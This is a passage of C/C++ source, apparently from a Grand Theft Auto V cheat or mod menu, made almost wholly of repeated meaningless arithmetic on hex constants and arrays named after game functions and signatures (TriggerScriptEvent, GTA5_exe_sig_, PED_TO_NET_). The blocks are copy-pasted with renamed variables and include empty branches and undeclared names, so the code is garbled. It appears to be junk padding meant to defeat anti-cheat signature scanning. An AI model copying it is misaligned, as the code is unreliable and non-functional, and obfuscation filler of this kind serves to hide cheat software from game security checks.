			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::INIFile::Float::GravarFloat(0, buffer, "RotX");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
